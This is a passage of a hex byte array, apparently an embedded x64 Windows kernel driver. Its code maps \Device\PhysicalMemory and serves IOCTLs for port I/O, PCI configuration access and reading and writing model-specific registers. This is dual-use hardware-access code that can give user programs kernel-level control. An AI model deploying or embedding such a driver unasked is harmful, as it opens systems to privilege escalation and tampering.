	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0xf1, 0x1f, 0x00, 0x00, 0x48,
	  0x8d, 0x4c, 0x24, 0x20, 0xff, 0x15, 0x56, 0x10, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xff,
	  0x15, 0x53, 0x10, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0xff, 0x15, 0x59, 0x10, 0x00, 0x00, 0x48,
	  0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x41, 0x8b, 0xc0, 0x48, 0x3b, 0xc8, 0x7c, 0x11, 0x8b, 0xd2, 0x48, 0x03, 0xd1, 0x43, 0x8d, 0x04,
	  0x08, 0x48, 0x3b, 0xd0, 0x7f, 0x03, 0xb0, 0x01, 0xc3, 0x32, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x53, 0x57, 0x48, 0x83, 0xec, 0x48, 0x4d, 0x8b, 0xd0, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x41, 0xb9,
	  0x00, 0x00, 0x02, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x0c, 0x00, 0xe8, 0xc1, 0xff, 0xff, 0xff, 0x84,
	  0xc0, 0x74, 0x09, 0xb0, 0x01, 0x48, 0x83, 0xc4, 0x48, 0x5f, 0x5b, 0xc3, 0x41, 0x8b, 0x42, 0x0c,
	  0x83, 0xf8, 0x05, 0x77, 0x57, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x14, 0x85,
	  0x10, 0x00, 0x00, 0x00, 0x45, 0x8b, 0x42, 0x08, 0x41, 0x83, 0xe0, 0x07, 0x41, 0xc1, 0xe0, 0x05,
	  0x41, 0x8b, 0x42, 0x04, 0x83, 0xe0, 0x1f, 0x44, 0x0b, 0xc0, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x89,
	  0x4c, 0x24, 0x28, 0x89, 0x54, 0x24, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x41, 0x8b, 0x12, 0xff,
	  0x15, 0x33, 0x0f, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x30, 0x41, 0x83, 0xf8, 0xff, 0x74, 0x0c,
	  0x45, 0x85, 0xc0, 0x74, 0x07, 0x41, 0x8b, 0xc0, 0x24, 0x01, 0x74, 0x09, 0x32, 0xc0, 0x48, 0x83,
	  0xc4, 0x48, 0x5f, 0x5b, 0xc3, 0x41, 0x81, 0xe0, 0x00, 0xff, 0xff, 0xff, 0x41, 0xb9, 0x00, 0x00,
	  0x00, 0x01, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0xe8, 0x34, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x48,
	  0x5f, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x48, 0x81, 0xec, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x8b,
	  0xd9, 0x41, 0x8b, 0xf0, 0x48, 0x8b, 0xfa, 0x45, 0x33, 0xe4, 0x4c, 0x89, 0x64, 0x24, 0x50, 0x4c,
	  0x89, 0xa4, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x47, 0x0c, 0x8b, 0x57, 0x08, 0x48, 0x8b,
	  0x0f, 0xe8, 0x0a, 0xff, 0xff, 0xff, 0x84, 0xc0, 0x0f, 0x84, 0x31, 0x01, 0x00, 0x00, 0x83, 0xfe,
	  0x20, 0x0f, 0x82, 0xf3, 0x01, 0x00, 0x00, 0x83, 0xfb, 0x08, 0x0f, 0x82, 0xea, 0x01, 0x00, 0x00,
	  0x48, 0x8b, 0x1f, 0x44, 0x89, 0x64, 0x24, 0x70, 0x44, 0x89, 0x64, 0x24, 0x74, 0x8b, 0x77, 0x08,
	  0x48, 0x8d, 0x15, 0xe9, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24, 0xc0, 0x00, 0x00, 0x00, 0xff,
	  0x15, 0xdb, 0x0e, 0x00, 0x00, 0xc7, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,
	  0x4c, 0x89, 0xa4, 0x24, 0x98, 0x00, 0x00, 0x00, 0xc7, 0x84, 0x24, 0xa8, 0x00, 0x00, 0x00, 0x40,
	  0x02, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0xc0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa0,
	  0x00, 0x00, 0x00, 0x4c, 0x89, 0xa4, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xa4, 0x24, 0xb8,
	  0x00, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x41, 0xbd, 0x1f, 0x00, 0x0f,
	  0x00, 0x41, 0x8b, 0xd5, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0xff, 0x15, 0x41, 0x0e, 0x00, 0x00, 0x85,
	  0xc0, 0x0f, 0x8c, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x89, 0x64, 0x24, 0x28, 0x48, 0x8d, 0x84, 0x24,
	  0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x32, 0xc9, 0x45, 0x33, 0xc0, 0x41,
	  0x8b, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xff, 0x15, 0x0b, 0x0e, 0x00, 0x00, 0x85, 0xc0, 0x0f,
	  0x8c, 0x3a, 0x01, 0x00, 0x00, 0x8b, 0xc6, 0x48, 0x03, 0xc3, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48,
	  0x8d, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x74, 0x4c, 0x8b,
	  0xc3, 0x33, 0xd2, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0xce, 0xff, 0x15, 0xb0, 0x0d, 0x00, 0x00,
	  0x0f, 0xb6, 0xd8, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x4c,
	  0x24, 0x70, 0x4c, 0x8b, 0x44, 0x24, 0x60, 0x33, 0xd2, 0x8b, 0xce, 0xff, 0x15, 0x8f, 0x0d, 0x00,
	  0x00, 0x84, 0xdb, 0x74, 0x1a, 0x84, 0xc0, 0x74, 0x16, 0x48, 0x8b, 0x4c, 0x24, 0x60, 0x48, 0x8b,
	  0x44, 0x24, 0x78, 0x48, 0x2b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x58, 0x85, 0xc9, 0x75, 0x14, 0xb8,
	  0x01, 0x00, 0x00, 0xc0, 0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f,
	  0x5e, 0x5b, 0xc3, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4c, 0x89, 0x64, 0x24, 0x68, 0x8b, 0xc1, 0x48,
	  0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x48, 0x04, 0x02, 0x00, 0x00, 0x44,
	  0x89, 0x64, 0x24, 0x40, 0x89, 0x74, 0x24, 0x38, 0x48, 0x8d, 0x8c, 0x24, 0x80, 0x00, 0x00, 0x00,
	  0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48,
	  0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x4c, 0x8d, 0x44, 0x24, 0x68, 0x48, 0xba, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xff, 0x15, 0x1f, 0x0d, 0x00,
	  0x00, 0x8b, 0xd8, 0x85, 0xdb, 0x7d, 0x1c, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xff, 0x15, 0x36, 0x0d,
	  0x00, 0x00, 0x8b, 0xc3, 0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f,
	  0x5e, 0x5b, 0xc3, 0x8b, 0x44, 0x24, 0x58, 0x8b, 0x4c, 0x24, 0x78, 0x48, 0x2b, 0xc8, 0x48, 0x8b,
	  0x44, 0x24, 0x68, 0x48, 0x03, 0xc1, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x89, 0x07, 0x48, 0x8b,
	  0x4c, 0x24, 0x50, 0xff, 0x15, 0xff, 0x0c, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0xd0, 0x00,
	  0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xb8, 0x9a, 0x00, 0x00, 0xc0, 0x48,
	  0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc,
	  0x5c, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5c, 0x00,
	  0x50, 0x00, 0x68, 0x00, 0x79, 0x00, 0x73, 0x00, 0x69, 0x00, 0x63, 0x00, 0x61, 0x00, 0x6c, 0x00,
	  0x4d, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x79, 0x00, 0x00, 0x00, 0xcc, 0xcc,
	  0x53, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xd9, 0x4c, 0x8d, 0x43, 0x20, 0x8b, 0x53, 0x10, 0x48,
	  0x8b, 0x0b, 0xe8, 0xa9, 0xfc, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x0b, 0xb8, 0x01, 0x00, 0x00, 0xc0,
	  0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d,
	  0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0x03,
	  0x33, 0xd2, 0xb9, 0x01, 0x00, 0x00, 0x00, 0xff, 0x15, 0x13, 0x0c, 0x00, 0x00, 0x84, 0xc0, 0x74,
	  0x22, 0x8b, 0x53, 0x10, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0xff, 0x15, 0x36, 0x0c,
	  0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0c, 0x48, 0x89, 0x43, 0x08, 0x33, 0xc0, 0x48, 0x83, 0xc4,
	  0x40, 0x5b, 0xc3, 0xb8, 0x9a, 0x00, 0x00, 0xc0, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0xcc,
	  0x81, 0xf9, 0xfc, 0x0c, 0x00, 0x00, 0x75, 0x21, 0x66, 0xba, 0xf8, 0x0c, 0xed, 0x8b, 0xc8, 0x81,
	  0xe1, 0x00, 0x00, 0x00, 0x80, 0x74, 0x12, 0x25, 0xfc, 0x00, 0x00, 0x00, 0x83, 0xf8, 0x10, 0x72,
	  0x08, 0x83, 0xf8, 0x27, 0x77, 0x03, 0x32, 0xc0, 0xc3, 0xb0, 0x01, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x48, 0x89, 0x54, 0x24, 0x10, 0x53, 0x57, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0xfa, 0x33, 0xdb,
	  0x89, 0x5f, 0x30, 0x48, 0x89, 0x5f, 0x38, 0x48, 0x8b, 0x87, 0xb8, 0x00, 0x00, 0x00, 0x4c, 0x8b,
	  0x57, 0x18, 0x8b, 0x50, 0x10, 0x44, 0x8b, 0x48, 0x08, 0x80, 0x38, 0x0e, 0x0f, 0x85, 0x3b, 0x05,
	  0x00, 0x00, 0x8b, 0x40, 0x18, 0x05, 0x00, 0xe0, 0xff, 0x7f, 0x83, 0xf8, 0x54, 0x0f, 0x87, 0x23,
	  0x05, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0x86, 0x05, 0x00, 0x00, 0x49, 0x0f, 0xb6, 0x04, 0x00, 0x4c,
	  0x8d, 0x05, 0x2e, 0x05, 0x00, 0x00, 0x49, 0x63, 0x04, 0x80, 0x4c, 0x8d, 0x05, 0x05, 0x00, 0x00,
	  0x00, 0x49, 0x03, 0xc0, 0xff, 0xe0, 0x83, 0xfa, 0x30, 0x75, 0x5f, 0x49, 0x8b, 0x4a, 0x08, 0x48,
	  0x85, 0xc9, 0x74, 0x4a, 0x41, 0x8b, 0x42, 0x18, 0x83, 0xe8, 0x01, 0x74, 0x25, 0x83, 0xe8, 0x01,
	  0x74, 0x12, 0x83, 0xe8, 0x02, 0x75, 0x27, 0x41, 0x8b, 0x42, 0x14, 0x8b, 0x04, 0x08, 0x41, 0x89,
	  0x42, 0x1c, 0xeb, 0x1a, 0x41, 0x8b, 0x42, 0x14, 0x0f, 0xb7, 0x04, 0x08, 0x41, 0x89, 0x42, 0x1c,
	  0xeb, 0x0c, 0x41, 0x8b, 0x42, 0x14, 0x0f, 0xb6, 0x04, 0x08, 0x41, 0x89, 0x42, 0x1c, 0x89, 0x5f,
	  0x30, 0x48, 0xc7, 0x47, 0x38, 0x30, 0x00, 0x00, 0x00, 0xe9, 0xaf, 0x04, 0x00, 0x00, 0xc7, 0x47,
	  0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xa3, 0x04, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00,
	  0xc0, 0xe9, 0x97, 0x04, 0x00, 0x00, 0x83, 0xfa, 0x30, 0x75, 0x5f, 0x49, 0x8b, 0x52, 0x08, 0x48,
	  0x85, 0xd2, 0x74, 0x4a, 0x41, 0x8b, 0x42, 0x18, 0x83, 0xe8, 0x01, 0x74, 0x26, 0x83, 0xe8, 0x01,
	  0x74, 0x12, 0x83, 0xe8, 0x02, 0x75, 0x27, 0x41, 0x8b, 0x4a, 0x14, 0x41, 0x8b, 0x42, 0x1c, 0x89,
	  0x04, 0x11, 0xeb, 0x1a, 0x41, 0x8b, 0x4a, 0x14, 0x66, 0x41, 0x8b, 0x42, 0x1c, 0x66, 0x89, 0x04,
	  0x11, 0xeb, 0x0b, 0x41, 0x8b, 0x4a, 0x14, 0x41, 0x8a, 0x42, 0x1c, 0x88, 0x04, 0x11, 0x89, 0x5f,
	  0x30, 0x48, 0xc7, 0x47, 0x38, 0x30, 0x00, 0x00, 0x00, 0xe9, 0x3f, 0x04, 0x00, 0x00, 0xc7, 0x47,
	  0x30, 0x9a, 0x00, 0x00, 0xc0, 0xe9, 0x33, 0x04, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00,
	  0xc0, 0xe9, 0x27, 0x04, 0x00, 0x00, 0x83, 0xfa, 0x30, 0x75, 0x28, 0x49, 0x8b, 0xca, 0xe8, 0xfd,
	  0xfd, 0xff, 0xff, 0x89, 0x47, 0x30, 0x85, 0xc0, 0x7c, 0x0d, 0x48, 0xc7, 0x47, 0x38, 0x30, 0x00,
	  0x00, 0x00, 0xe9, 0x06, 0x04, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x9a, 0x00, 0x00, 0xc0, 0xe9, 0xfa,
	  0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xee, 0x03, 0x00, 0x00, 0x83,
	  0xfa, 0x30, 0x75, 0x27, 0x49, 0x8b, 0x4a, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x12, 0x41, 0x8b, 0x52,
	  0x10, 0xff, 0x15, 0x71, 0x0a, 0x00, 0x00, 0x89, 0x5f, 0x30, 0xe9, 0xce, 0x03, 0x00, 0x00, 0xc7,
	  0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xc2, 0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00,
	  0x00, 0xc0, 0xe9, 0xb6, 0x03, 0x00, 0x00, 0x44, 0x8b, 0xc2, 0x49, 0x8b, 0xd2, 0xe8, 0x0e, 0xfb,
	  0xff, 0xff, 0x89, 0x47, 0x30, 0x85, 0xc0, 0x7c, 0x0e, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89,
	  0x47, 0x38, 0xe9, 0x96, 0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x8a,
	  0x03, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x72, 0x1b, 0x49, 0x8b, 0x12, 0x48, 0xb9, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x15, 0x05, 0x0a, 0x00, 0x00, 0x89, 0x47, 0x30, 0xe9, 0x6a,
	  0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x01, 0x00, 0x00, 0xc0, 0xe9, 0x5e, 0x03, 0x00, 0x00, 0x83,
	  0xfa, 0x08, 0x75, 0x1d, 0x66, 0x41, 0x8b, 0x12, 0xec, 0x0f, 0xbe, 0xc0, 0x41, 0x89, 0x42, 0x04,
	  0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0x3c, 0x03, 0x00,
	  0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x30, 0x03, 0x00, 0x00, 0x83, 0xfa, 0x08,
	  0x75, 0x1e, 0x66, 0x41, 0x8b, 0x12, 0x66, 0xed, 0x0f, 0xb7, 0xc0, 0x41, 0x89, 0x42, 0x04, 0x89,
	  0x5f, 0x30, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0x0d, 0x03, 0x00, 0x00,
	  0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x01, 0x03, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75,
	  0x1a, 0x66, 0x41, 0x8b, 0x12, 0xed, 0x41, 0x89, 0x42, 0x04, 0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00,
	  0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0xe2, 0x02, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00,
	  0x00, 0xc0, 0xe9, 0xd6, 0x02, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x36, 0x41, 0x8b, 0x52, 0x04,
	  0x41, 0x8b, 0x0a, 0xe8, 0x28, 0xfd, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x0c, 0xc7, 0x47, 0x30, 0x0d,
	  0x00, 0x00, 0xc0, 0xe9, 0xb5, 0x02, 0x00, 0x00, 0x66, 0x41, 0x8b, 0x12, 0x41, 0x8a, 0x42, 0x04,
	  0xee, 0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0x9b, 0x02,
	  0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x8f, 0x02, 0x00, 0x00, 0x83, 0xfa,
	  0x08, 0x75, 0x38, 0x41, 0x8b, 0x52, 0x04, 0x41, 0x8b, 0x0a, 0xe8, 0xe1, 0xfc, 0xff, 0xff, 0x84,
	  0xc0, 0x75, 0x0c, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x6e, 0x02, 0x00, 0x00, 0x66,
	  0x41, 0x8b, 0x12, 0x66, 0x41, 0x8b, 0x42, 0x04, 0x66, 0xef, 0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00,
	  0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0x52, 0x02, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00,
	  0x00, 0xc0, 0xe9, 0x46, 0x02, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x36, 0x41, 0x8b, 0x52, 0x04,
	  0x41, 0x8b, 0x0a, 0xe8, 0x98, 0xfc, 0xff, 0xff, 0x84, 0xc0, 0x75, 0x0c, 0xc7, 0x47, 0x30, 0x0d,
	  0x00, 0x00, 0xc0, 0xe9, 0x25, 0x02, 0x00, 0x00, 0x66, 0x41, 0x8b, 0x12, 0x41, 0x8b, 0x42, 0x04,
	  0xef, 0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x38, 0xe9, 0x0b, 0x02,
	  0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xff, 0x01, 0x00, 0x00, 0x83, 0xfa,
	  0x08, 0x75, 0x1c, 0x41, 0xc7, 0x02, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x41,
	  0x89, 0x42, 0x04, 0x89, 0x5f, 0x30, 0x48, 0x89, 0x47, 0x38, 0xe9, 0xde, 0x01, 0x00, 0x00, 0xc7,
	  0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xd2, 0x01, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x35,
	  0x41, 0x8b, 0x02, 0x8b, 0x0d, 0x5b, 0x18, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x80, 0x0f, 0x45,
	  0xc8, 0x89, 0x0d, 0x4d, 0x18, 0x00, 0x00, 0x41, 0x03, 0x4a, 0x04, 0x89, 0x0d, 0x43, 0x18, 0x00,
	  0x00, 0x41, 0x89, 0x0a, 0x89, 0x5f, 0x30, 0xb8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x38,
	  0xe9, 0x98, 0x01, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x8c, 0x01, 0x00,
	  0x00, 0x83, 0xfa, 0x0c, 0x75, 0x44, 0x41, 0x8b, 0x0a, 0x0f, 0x32, 0x8b, 0xca, 0x48, 0xc1, 0xe1,
	  0x20, 0x48, 0x0b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0xc1, 0xe9, 0x20, 0x41, 0x89, 0x4a,
	  0x04, 0x8b, 0x44, 0x24, 0x30, 0x41, 0x89, 0x42, 0x08, 0x89, 0x5f, 0x30, 0x48, 0xc7, 0x47, 0x38,
	  0x0c, 0x00, 0x00, 0x00, 0xe9, 0x54, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0xc7, 0x47,
	  0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x43, 0x01, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00,
	  0xc0, 0xe9, 0x37, 0x01, 0x00, 0x00, 0x83, 0xfa, 0x0c, 0x75, 0x3c, 0x41, 0x8b, 0x42, 0x04, 0x48,
	  0xc1, 0xe0, 0x20, 0x41, 0x8b, 0x4a, 0x08, 0x48, 0x0b, 0xc1, 0x48, 0x8b, 0xd0, 0x48, 0xc1, 0xea,
	  0x20, 0x41, 0x8b, 0x0a, 0x0f, 0x30, 0x89, 0x5f, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x0c, 0x00, 0x00,
	  0x00, 0xe9, 0x07, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0xc7, 0x47, 0x30, 0x0d, 0x00,
	  0x00, 0xc0, 0xe9, 0xf6, 0x00, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xea,
	  0x00, 0x00, 0x00, 0x83, 0xfa, 0x18, 0x75, 0x5d, 0x41, 0x8b, 0x4a, 0x10, 0x85, 0xc9, 0x74, 0x49,
	  0x83, 0xf9, 0x04, 0x77, 0x44, 0x4d, 0x8d, 0x4a, 0x14, 0x45, 0x8b, 0x42, 0x08, 0x41, 0x83, 0xe0,
	  0x07, 0x41, 0xc1, 0xe0, 0x05, 0x41, 0x8b, 0x42, 0x04, 0x83, 0xe0, 0x1f, 0x44, 0x0b, 0xc0, 0x89,
	  0x4c, 0x24, 0x28, 0x41, 0x8b, 0x42, 0x0c, 0x89, 0x44, 0x24, 0x20, 0x41, 0x8b, 0x12, 0xb9, 0x04,
	  0x00, 0x00, 0x00, 0xff, 0x15, 0xef, 0x06, 0x00, 0x00, 0x89, 0x5f, 0x30, 0x48, 0xc7, 0x47, 0x38,
	  0x18, 0x00, 0x00, 0x00, 0xe9, 0x94, 0x00, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0,
	  0xe9, 0x88, 0x00, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x7f, 0x83, 0xfa,
	  0x18, 0x75, 0x6a, 0x41, 0x8b, 0x4a, 0x10, 0x85, 0xc9, 0x74, 0x59, 0x83, 0xf9, 0x04, 0x77, 0x54,
	  0x41, 0x8b, 0x52, 0x0c, 0x83, 0xfa, 0x10, 0x72, 0x0e, 0x83, 0xfa, 0x27, 0x77, 0x09, 0xc7, 0x47,
	  0x30, 0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x56, 0x4d, 0x8d, 0x4a, 0x14, 0x45, 0x8b, 0x42, 0x08, 0x41,
	  0x83, 0xe0, 0x07, 0x41, 0xc1, 0xe0, 0x05, 0x41, 0x8b, 0x42, 0x04, 0x83, 0xe0, 0x1f, 0x44, 0x0b,
	  0xc0, 0x89, 0x4c, 0x24, 0x28, 0x89, 0x54, 0x24, 0x20, 0x41, 0x8b, 0x12, 0xb9, 0x04, 0x00, 0x00,
